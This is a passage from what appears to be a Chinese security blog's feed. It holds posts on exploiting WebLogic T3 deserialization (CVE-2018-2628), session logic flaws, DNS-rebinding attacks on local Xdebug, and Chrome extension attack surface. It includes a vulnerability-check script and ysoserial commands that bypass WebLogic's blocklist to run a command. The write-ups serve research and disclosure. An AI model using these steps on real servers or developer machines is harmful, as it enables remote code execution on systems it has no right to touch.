class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVul</span><span class="params">(res,server_addr,index)</span>:</span></span><br><span class="line">    p=re.findall(VER_SIG[index], res, re.S)</span><br><span class="line">    <span class="keyword">if</span> len(p)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>],VUL[index])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[<span class="number">0</span>],server_addr[<span class="number">1</span>],VUL[index])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(dip,dport,index)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></span><br><span class="line">    sock.settimeout(<span class="number">50</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3handshake(sock,server_addr)</span><br><span class="line">    buildT3RequestObject(sock,dport)</span><br><span class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</span><br><span class="line">    checkVul(rs,server_addr,index)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    dip = <span class="string">'10.8.56.17'</span></span><br><span class="line">    dport = <span class="number">7001</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(VUL)):</span><br><span class="line">        run(dip,dport,i)</span><br></pre></td></tr></table></figure></p><p>还有一份 java 版的 T3 协议的模拟。 <a href="https://github.com/5up3rc/weblogic_cmd" target="_blank" rel="noopener">https://github.com/5up3rc/weblogic_cmd</a></p><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogic" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogic</a><br><a href="https://docs.oracle.com/cd/E28280_01/web.1111/e13721/rmi_t3.htm" target="_blank" rel="noopener">https://docs.oracle.com/cd/E28280_01/web.1111/e13721/rmi_t3.htm</a><br><a href="https://docs.oracle.com/cd/E11035_01/wls100/client/t3.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E11035_01/wls100/client/t3.html</a><br><a href="https://wsygoogol.github.io/2016/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://wsygoogol.github.io/2016/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br><a href="https://github.com/jas502n/CVE-2018-2628" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2018-2628</a></p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>根据 xxlegend 大佬的描述</p><blockquote><p>来看看InboundMsgAbbrev中resolveProxyClass的实现，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，其实随便找一个rmi接口即可绕过。</p></blockquote><p>很容易就能 grep 到这个类在 <code>com.bea.core.weblogic.rmi.client.jar</code> 中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  modules grep -r <span class="string">'InboundMsgAbbrev'</span> .</span><br><span class="line">Binary file ./clients/com.oracle.webservices.wls.jaxrpc-client.jar matches</span><br><span class="line">Binary file ./clients/com.oracle.webservices.wls.jaxws-wlswss-client.jar matches</span><br><span class="line">Binary file ./com.bea.core.weblogic.rmi.client.jar matches</span><br></pre></td></tr></table></figure></p><p>在代码里看到了对<code>java.rmi.registry.Registry</code>的判断。即使用除此之外的其他方法就能绕过。在这个函数下断点，可以看到 xxlegend 大佬使用的是<code>java.rmi.activation</code>。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    String[] var2 = interfaces;</span><br><span class="line">    <span class="keyword">int</span> var3 = interfaces.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">        String intf = var2[var4];</span><br><span class="line">        <span class="keyword">if</span> (intf.equals(<span class="string">"java.rmi.registry.Registry"</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Unauthorized proxy deserialization"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当我用 ysoserial 的 JRMPClient 生成 payload 放在上面的 python 脚本里时，发现在断点附近抛出了<code>InvalidObjectException</code>。所以说，ysoserial 生成的 payload 是用的<code>java.rmi.registry.Registry</code>，而 weblogic 对他进行了判断。只要修改 ysoserial 里 JRMPClient 的实现代码，改为用<code>java.rmi.activation</code>就行了。其实也不止是<code>java.rmi.activation</code>，只要是 extends <code>java.rmi.Remote</code> 的 interface 即可，如<code>javax.management.remote.rmi.RMIConnection</code>、<code>sun.jvmstat.monitor.remote.RemoteVm</code>等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Activator proxy = (Activator)Proxy.newProxyInstance(JRMPClient.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Activator.class&#125;,obj);</span><br></pre></td></tr></table></figure><p>重新编译并生成payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 8.8.8.8:1099</span><br></pre></td></tr></table></figure></p><p>在服务器执行<code>java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;touch /tmp/salt&quot;</code>。<br>运行脚本即可成功。</p><h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a><br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>经过测试发现，在docker里的 weblogic 可以轻松打成功，而装在 Mac 上的 weblogic 就是打不动。远程的服务器能收到连接，但是命令没有执行。问了头师傅，说可能是因为那些基础库更新了，ysoserial 里的 gadget 不能使用了。为了实锤这一点，我从 docker 里看了下 commons-collections 库的版本，是 3.2.0。而 commons-collections 在 3.2.1 版本对反序列化问题做了一些检查。如果想在新版的 weblogic 上打成功需要找其他的 gadget。</p><h3 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h3><p><a href="https://commons.apache.org/proper/commons-collections/release_3_2_2.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-collections/release_3_2_2.html</a><br><a href="https://xz.aliyun.com/t/1631" target="_blank" rel="noopener">https://xz.aliyun.com/t/1631</a></p><p>感谢头师傅全程带飞。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;安装-weblogic&quot;&gt;&lt;a href=&quot;#安装-weblogic&quot; class=&quot;headerlink&quot; title=&quot;安装 weblogic&quot;&gt;&lt;/a&gt;安装 weblogic&lt;/h2&gt;&lt;h3 id=&quot;官网下载安装&quot;&gt;&lt;a href=&quot;#官网下载安装&quot; class=&quot;headerlink&quot; title=&quot;官网下载安装&quot;&gt;&lt;/a&gt;官网下载安装&lt;/h3&gt;&lt;p&gt;下载地址 &lt;a href=&quot;http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html&lt;/a&gt; ，需要注册账号。&lt;/p&gt;
&lt;p&gt;安装完之后会弹出向导配置，在 Mac 上安装报错&lt;code&gt;java.io.IOException: Too many open files&lt;/code&gt;，需要执行以下命令。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo sysctl -w kern.maxfiles=20480&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo sysctl -w kern.maxfilesperproc=18000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>业务逻辑中的session问题</title>
    <link href="http://5alt.me/2018/04/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E4%B8%AD%E7%9A%84session%E9%97%AE%E9%A2%98/"/>
    <id>http://5alt.me/2018/04/业务逻辑中的session问题/</id>
    <published>2018-04-16T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.786Z</updated>
    
    <content type="html"><![CDATA[<p>在之前的一些安全检测中，经常会遇到一些逻辑漏洞。有些问题可以看到有很多测试是否存在问题的方法，很少有说明漏洞产生的原因。在这儿简单说几个与session有关的问题以及原因。</p><p>在WEB中，很重要的一个特征就是每个HTTP请求都是独立的，服务器通过session和数据库记录当前请求的状态。session可以看作数据库的一层缓存，用户是不能直接控制的。有的服务端代码实现上存在一些问题，导致实际运行逻辑和session中的状态不一定匹配，从而产生一些逻辑漏洞。<br><a id="more"></a></p><h2 id="步骤乱序"><a href="#步骤乱序" class="headerlink" title="步骤乱序"></a>步骤乱序</h2><p>服务器在业务逻辑中需要校验之前的步骤有没有完成，如果没有做好检查，这样有些步骤可能被跳过，有些后面的步骤可以放在前面干扰业务逻辑，导致出现逻辑漏洞。<br>一个非常简单的例子就是在更换手机号的时候没有检查是否完成了旧手机号的验证，导致可以直接进行绑定新手机号的逻辑。</p><h2 id="session-中字段名冲突"><a href="#session-中字段名冲突" class="headerlink" title="session 中字段名冲突"></a>session 中字段名冲突</h2><p>很多情况下一套业务逻辑是由多个步骤完成的，这时候在session中经常会存储一些值来记录业务流程中的一些数据。当提交的请求中不包含一些数据，但是业务逻辑的确又会用到这些数据的时候，这些数据有极大的可能存放在session中。程序员在开发的过程中为变量取名有一定的规律，比如为手机号码取名为<code>phone</code>，甚至在两个用于不同的业务逻辑中的手机号码习惯性的取同一个session名字，此时在session中发生字段名冲突，可能造成对应session值的覆盖。</p><p>以手机号码短信验证逻辑为例。在正确的业务流程中，每一个验证码有三个特征：phone(电话)，code(验证码)，type(业务)。一般分为四种类型：</p><ol><li>phone, code, type相互独立</li><li>phone和code绑定</li><li>type和code绑定</li><li>三者同时绑定</li></ol><p>绑定的意思是，其中一项不能被单独覆盖掉。根据这四种类型，可以有如下几种攻击方式。</p><h3 id="业务覆盖"><a href="#业务覆盖" class="headerlink" title="业务覆盖"></a>业务覆盖</h3><p>用自己的修改密码处的验证码，提交在找回别人密码处。</p><h3 id="用户名冲突"><a href="#用户名冲突" class="headerlink" title="用户名冲突"></a>用户名冲突</h3><p>通过某些验证后，利用其他功能（如找回密码）将session中手机号替换成受害者的手机号。</p><h3 id="验证码名冲突"><a href="#验证码名冲突" class="headerlink" title="验证码名冲突"></a>验证码名冲突</h3><p>验证码存放在session里，找其他能向任意手机发送验证码的地方，如注册处，获得的验证码填充在用于验证不可控的地方。</p><p>当然，正确的处理方式是phone, code, type三者绑定，并避免字段名冲突。</p><h2 id="session和数据库不一致"><a href="#session和数据库不一致" class="headerlink" title="session和数据库不一致"></a>session和数据库不一致</h2><p>为了方便，服务器经常会从session中取数据进行业务逻辑操作。而session作为数据库之上的缓存，可能会发生session与数据库不一致的情况。这种问题常常出现在在两个浏览器中登录同一个账号，在其中一个浏览器中对数据库进行了操作，导致数据库中的数据和第二个浏览器session中的数据不一致，可能会出现一些逻辑问题。</p><p>业务场景可能出现在物品买卖处，如果为了方便直接从session里获取余额而没查一次数据库，则可能出现问题。</p><p>最后，上述攻击模型不能覆盖到所有的实际场景，如有新的思路希望能一起探讨。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在之前的一些安全检测中，经常会遇到一些逻辑漏洞。有些问题可以看到有很多测试是否存在问题的方法，很少有说明漏洞产生的原因。在这儿简单说几个与session有关的问题以及原因。&lt;/p&gt;
&lt;p&gt;在WEB中，很重要的一个特征就是每个HTTP请求都是独立的，服务器通过session和数据库记录当前请求的状态。session可以看作数据库的一层缓存，用户是不能直接控制的。有的服务端代码实现上存在一些问题，导致实际运行逻辑和session中的状态不一定匹配，从而产生一些逻辑漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>利用恶意页面攻击本地Xdebug</title>
    <link href="http://5alt.me/2018/04/%E5%88%A9%E7%94%A8%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0Xdebug/"/>
    <id>http://5alt.me/2018/04/利用恶意页面攻击本地Xdebug/</id>
    <published>2018-04-02T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<p>TL;DR<br>PHP开发者以及一些安全研究人员经常会在本地搭建一个基于Xdebug的PHP的调试服务，在大部分配置情况下，Xdebug采用HTTP请求头中的<code>X-Forwarded-For</code>字段作为DBGp协议的回连地址。受害者浏览攻击页面一段时间，攻击者可利用DNS Rebind技术向本地服务器发送带有恶意<code>X-Forwarded-For</code>的请求，即有可能在受害者电脑上执行任意代码。</p><p>前段时间看到VSCode修复了一个RCE的漏洞，讲的是VSCode在本地开放了一个Nodejs的调试端口，通过DNS Rebind的技术可以获取到调试用的WebSocket接口，即可执行任意代码实现RCE。这让我想起了PHP的调试工具Xdebug。<br><a id="more"></a><br>Xdebug是用于调试PHP的扩展，可以根据本地源码远程调试服务器上的PHP代码。很多开发者和安全研究人员通常会在本地搭建一套PHP的调试环境，用于日常的开发和调试。对于Xdebug的攻击，之前Ricter写了一篇文章介绍过。文章里提到了如果服务器开启了Xdebug的回连，并且攻击者能直接访问到服务器的话，可以直接造成RCE。</p><p>但是大部分情况下，这些服务器处于内网环境中，有些甚至监听在<code>127.0.0.1</code>上，攻击者很难直接访问到，导致无法利用。如果把开发人员当做代理，利用CSRF来攻击位于内网的Xdebug呢？</p><p>我们首先看一下Xdebug有关<a href="https://xdebug.org/docs/all_settings#remote_connect_back" target="_blank" rel="noopener">远程调试的文档</a>。<br>如果<code>xdebug.remote_connect_back</code>启用，<code>xdebug.remote_host</code>没有设置，Xdebug会主动连接发起HTTP请求的客户端。Xdebug会依次检测<code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>、<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>来决定回连的IP地址。</p><p>即当Xdebug有类似如下的配置的时候，即有机会让Xdebug回连到请求头中<code>X-Forwarded-For</code>指向的ip地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_log =  /tmp/test.log</span><br></pre></td></tr></table></figure></p><p>一般来讲，在PHP开发人员的本地环境中会有<code>index.php</code>和<code>config.php</code>等文件。在受害者访问攻击者的恶意页面时，攻击者可以让受害者在浏览器里尝试向本地url如<code>http://127.0.0.1/index.php?XDEBUG_SESSION_START</code>或者<code>http://127.0.0.1/config.php?XDEBUG_SESSION_START</code>发起HTTP请求，并带有指向攻击者服务器的<code>X-Forwarded-For</code>请求头。这样攻击者就能在自己的服务器上收到来自受害者的DBGp协议的连接，在受害者的电脑上执行任意PHP代码。</p><p>我们都知道，在浏览器里发送带有非<a href="https://developer.mozilla.org/en-US/docs/Glossary/Simple_header" target="_blank" rel="noopener">simple header</a>的CORS请求的时候，需要先发送一个<a href="https://developer.mozilla.org/en-US/docs/Glossary/preflight_request" target="_blank" rel="noopener">preflight request</a>探测服务器是否允许发送这种请求头。此检测过程是由一个<code>OPTIONS</code>请求完成的。如果<code>OPTIONS</code>请求的响应头里有<code>Access-Control-Allow-Headers: X-Forwarded-For</code>这一项的话，才能发送带有<code>X-Forwarded-For</code>的GET或者POST请求。在受害者的本地环境中，几乎不会有这种响应头的。</p><p>不过，攻击者可以采用DNS Rebind的方式来绕过这个限制。攻击者首先自己搭建一个DNS解析服务器，让自己控制的域名在发生第一次DNS解析的时候指向攻击者的服务器，以后都解析到<code>127.0.0.1</code>。这样当受害者访问攻击者的页面（<code>http://attacker-domain-with-dns-rebind/exp.html</code>）的时候，会从攻击者的服务器上拉取攻击代码，使浏览器循环向<code>http://attacker-domain-with-dns-rebind/index.php?XDEBUG_SESSION_START</code>发送带有恶意<code>X-Forwarded-For</code>头的请求。因为攻击者存放攻击代码的页面和触发Xdebug回连请求的url在同一个域内，即可不用发送前面所说的preflight request。</p><p>由于DNS的解析结果也存在一定的缓存时间，在浏览器里大概需要1分钟的时间才会失效进行第二次解析。在发生第二次解析的时候，其指向的IP地址会变为<code>127.0.0.1</code>，即向受害者本地的服务器发送能触发Xdebug反弹的请求，这时候攻击者的服务器就能收到来自受害者Xdebug的连接了。攻击者可以通过DBGp协议中的eval命令在客户端执行任意php代码。</p><p>我们认为漏洞的成因是Xdebug从<code>X-Forwarded-For</code>头中取IP作为回连地址，而<code>X-Forwarded-For</code>头是不可信的。</p><p>我于2018年3月26日将此问题报告给PHP官方，PHP官方人员于2018年3月30日作出回应，不认为这是一个安全问题，并将报告转为bug使之处于公开状态。建议PHP开发人员和安全研究人员在Xdebug的配置文件中根据当前情况增加<code>xdebug.remote_host</code>配置项，来防止自己遭受此攻击。</p><p>参考文献<br><a href="https://bugs.php.net/bug.php?id=76149" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=76149</a><br><a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a><br><a href="https://medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486b" target="_blank" rel="noopener">https://medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486b</a><br><a href="http://bluec0re.blogspot.ch/2018/03/cve-2018-7160-pwning-nodejs-developers.html" target="_blank" rel="noopener">http://bluec0re.blogspot.ch/2018/03/cve-2018-7160-pwning-nodejs-developers.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TL;DR&lt;br&gt;PHP开发者以及一些安全研究人员经常会在本地搭建一个基于Xdebug的PHP的调试服务，在大部分配置情况下，Xdebug采用HTTP请求头中的&lt;code&gt;X-Forwarded-For&lt;/code&gt;字段作为DBGp协议的回连地址。受害者浏览攻击页面一段时间，攻击者可利用DNS Rebind技术向本地服务器发送带有恶意&lt;code&gt;X-Forwarded-For&lt;/code&gt;的请求，即有可能在受害者电脑上执行任意代码。&lt;/p&gt;
&lt;p&gt;前段时间看到VSCode修复了一个RCE的漏洞，讲的是VSCode在本地开放了一个Nodejs的调试端口，通过DNS Rebind的技术可以获取到调试用的WebSocket接口，即可执行任意代码实现RCE。这让我想起了PHP的调试工具Xdebug。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>chrome 浏览器扩展安全</title>
    <link href="http://5alt.me/2018/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E5%AE%89%E5%85%A8/"/>
    <id>http://5alt.me/2018/02/浏览器扩展安全/</id>
    <published>2018-02-26T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<p>去年8月份的时候fc老板带我搞了一波浏览器扩展的问题，屯了一些思路想批量扫描一下 chrome 扩展商店里的热门扩展，一直拖着没动，今天发现被大佬做了。</p><p>浏览器扩展的配置文件为<code>manifest.json</code>，里面规定了扩展的权限和一些其他的属性。其中比较常见且重要的属性有<code>content_security_policy</code>, <code>permissions</code>, <code>content_scripts</code>。<code>content_security_policy</code>指明了扩展所遵循的CSP规则，<code>permissions</code>代表扩展所拥有的访问权限，<code>content_scripts</code>则是会插入到页面中的脚本。<br><a id="more"></a></p><h2 id="浏览器扩展的CSP"><a href="#浏览器扩展的CSP" class="headerlink" title="浏览器扩展的CSP"></a>浏览器扩展的CSP</h2><p>在chrome浏览器的文档里，默认的CSP是<code>script-src &#39;self&#39;; object-src &#39;self&#39;</code>。<br>而在某第三方浏览器中，扩展默认的CSP是<code>script-src &#39;self&#39; blob: filesystem: chrome-extension-resource:; object-src &#39;self&#39; blob: filesystem:;</code>。</p><p>其中，<a href="https://developer.mozilla.org/en-US/docs/Web/API/Blob" target="_blank" rel="noopener">blob协议</a>和<a href="https://developer.mozilla.org/en-US/docs/Web/API/FileSystem" target="_blank" rel="noopener">filesystem协议</a>只能用过JavaScript代码来创建。</p><p>这意味着，在扩展里默认不能使用内联脚本，不能引用外部的js文件，不能动态类似eval那样执行js。同时我们也不能引入外部的swf文件通过flash来xss。<br>因此，即使在扩展里发现了dom类型的xss，也难以利用来完成攻击。即<code>innerHTML</code>或者<code>document.write</code>之类方法根本不需要去看，即使能利用成功插入任意内容也不能执行JavaScript代码。</p><p>当然，在引用了一些有漏洞的库之后，还是存在被攻击的可能的。（ 如 <a href="http://5alt.me/2017/09/jQuery%E9%87%8C%E7%9A%84html()/">http://5alt.me/2017/09/jQuery%E9%87%8C%E7%9A%84html()/</a> ）</p><h2 id="浏览器的-content-scripts"><a href="#浏览器的-content-scripts" class="headerlink" title="浏览器的 content_scripts"></a>浏览器的 content_scripts</h2><p><code>content_scripts</code>会在网页的上下文中运行，不过是在一个称为隔离环境的特殊环境中执行。它们可以访问所在页面的 DOM，但是不能访问当前页面创建的任何 JavaScript 变量或函数。在当前页面运行的 JavaScript 不能调用或访问任何内容脚本定义的函数或变量。<code>content_scripts</code>执行的域是当前页面所在的域，但是仍有部分特权。</p><p>当然有的浏览器里并未对此做隔离，导致了扩展里调用的函数被页面中js劫持的情况。不过在不存在问题的情况下，很难对<code>content_scripts</code>做手脚，因此与之相关的<code>manifest.json</code>的配置项提到的文件以及<code>chrome.tabs.executeScript</code>函数都可以不必关心。</p><p>有人可能存在疑问，像<code>tampermonkey</code>，它往页面注入js脚本，脚本中的变量可以被页面访问到，这不是违反了安全规则么。<code>tampermonkey</code>的做法是，先往页面中动态插一个script节点，执行完毕之后删除。这样在页面的DOM里不会发现注入的脚本，同时脚本也和当前页面在同一个执行环境里。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// page.js</span></span><br><span class="line">inject: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> u = <span class="string">"text/xml"</span> == <span class="built_in">document</span>.contentType ? <span class="built_in">document</span>.createElementNS(<span class="string">"http://www.w3.org/1999/xhtml"</span>, <span class="string">"script"</span>) : <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">        u.textContent = a;</span><br><span class="line">        (<span class="built_in">document</span>.head || <span class="built_in">document</span>.body || <span class="built_in">document</span>.documentElement || <span class="built_in">document</span>).appendChild(u);</span><br><span class="line">        u.parentNode.removeChild(u)</span><br></pre></td></tr></table></figure><p>此外，根据nearg1e大佬的文章，</p><blockquote><ol><li><p>background 并不是每次访问页面执行一次，内部定义的变量不会因为页面刷新而重新定义。</p></li><li><p>background 即使域改变也不会重新定义和赋值，所有的域都用一个 runtime。</p></li></ol><p>第一点使得这个漏洞更加容易利用，第二点使得我们所写的 payload 并不只影响在 payload 中利用的网站，而是在浏览器和扩展为重启之前，每次访问新的页面都可以在不同域下触发 payload。</p></blockquote><h2 id="浏览器扩展的通信方式"><a href="#浏览器扩展的通信方式" class="headerlink" title="浏览器扩展的通信方式"></a>浏览器扩展的通信方式</h2><p>在浏览器中，页面与扩展通信、扩展之间通信、扩展内通信采用的是消息机制。扩展可以通过<code>chrome.runtime.onMessage</code>, <code>chrome.runtime.onMessageExternal</code>, <code>chrome.runtime.onConnect</code>, <code>chrome.runtime.onConnectExternal</code>监听消息事件并处理。其中<code>chrome.runtime.onMessage</code>和<code>chrome.runtime.onConnect</code>监听的是扩展内部消息传送，而<code>chrome.runtime.onMessageExternal</code>和<code>chrome.runtime.onConnectExternal</code>则是接收页面和其他扩展的消息。所以我们需要关注的是后面两个External的接口。</p><p>接口的权限在<code>manifest.json</code>的<code>externally_connectable</code>中进行权限设置，但有的浏览器会在此之外自行添加可以发起通信的作用域。这里更多的会出现一些逻辑问题。（尤其是在CSP的影响下）</p><p>除此之外，扩展还可以通过<code>window.addEventListener</code>的方式在原页面添加事件，如<code>message</code>事件，从页面获取事件消息。</p><h2 id="浏览器的特权API"><a href="#浏览器的特权API" class="headerlink" title="浏览器的特权API"></a>浏览器的特权API</h2><p>很多人谈浏览器安全总是绕不过一个词叫做特权域。其实并不是因为这个域被列入了特权的白名单，而是有些特权的API只允许某些页面来调用。chrome源码里有几个<a href="https://chromium.googlesource.com/chromium/src/+/master/chrome/common/extensions/api/_features.md" target="_blank" rel="noopener"><code>_api_features.json</code></a>文件规定了一些API的调用来源范围。如果在某个有危险功能API所允许的域上发现了XSS，那么就会出现严重的安全问题。虽然有些API只允许某个域上的某些页面调用特权API，但是如果在这个域上的其他页面发现XSS也是可以进行攻击的，毕竟同域上没有页面之间隔离的说法。同理，如果特权API允许了http页面来调用，还会存在被中间人的风险。<br>所以寻找浏览器扩展方面的安全问题最好能知道浏览器存在哪些API，然后筛选出具有敏感操作的API，找出这些API允许调用的页面，然后寻找页面所在域的问题。<br>不过浏览器会存在一些默认的安全机制，阻止跨协议的跳转。即使有些页面存在 DOM 型的 XSS，但由于无法从http协议页面跳转过去，其被利用的可能性就会大大降低。</p><p>附一个解析<code>_api_features.json</code>的<a href="/downloads/api_features.py">小脚本</a>。</p><h2 id="浏览器扩展的攻击面"><a href="#浏览器扩展的攻击面" class="headerlink" title="浏览器扩展的攻击面"></a>浏览器扩展的攻击面</h2><p>从上面我们可以看到，在默认的情况下，即使一个扩展做的非常烂，由于浏览器默认的安全机制，也能保证该扩展自身大概率不受攻击。</p><p>如果攻击者能控制允许发消息的页面能发起通信，那么需要找扩展的<code>chrome.runtime.onMessageExternal</code>和<code>chrome.runtime.onConnectExternal</code>事件，分析是否存在问题。<br>如果攻击者能在特权域找到一个XSS，就可以通过允许该页面允许的特权API做一些事情。<br>如果攻击者能中间人，可以尝试中间人特权域页面，或者寻找扩展中http的请求。<br>如果扩展将用户的数据<code>innerHTML</code>到扩展自身的页面显示，在CSP设置有问题的前提下，可以以扩展的权限执行代码。<br>如果扩展会在第三方页面上利用<code>innerHTML</code>方式插入一些代码并直接拼接了用户数据，则可能造成该页面的xss。<br>如果扩展将用户可控的内容以html的形式输出在页面上的话，需要注意是否会造成当前域以及其他域的xss。</p><p>在实际的攻击利用场景中，寻找特权域xss的方式是比较常见的，但中间人造成的影响不容忽视。</p><p>最后附一个静态分析 js 里关键字来辅助找扩展漏洞的<a href="/downloads/chrome_extension_static_analyzer.py">脚本</a>。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://content-security-policy.com/" target="_blank" rel="noopener">https://content-security-policy.com/</a><br><a href="https://developer.chrome.com/extensions/contentSecurityPolicy" target="_blank" rel="noopener">https://developer.chrome.com/extensions/contentSecurityPolicy</a><br><a href="https://developer.chrome.com/extensions/content_scripts" target="_blank" rel="noopener">https://developer.chrome.com/extensions/content_scripts</a><br><a href="https://developer.chrome.com/extensions/messaging" target="_blank" rel="noopener">https://developer.chrome.com/extensions/messaging</a><br><a href="https://crxdoc-zh.appspot.com/extensions/" target="_blank" rel="noopener">https://crxdoc-zh.appspot.com/extensions/</a><br><a 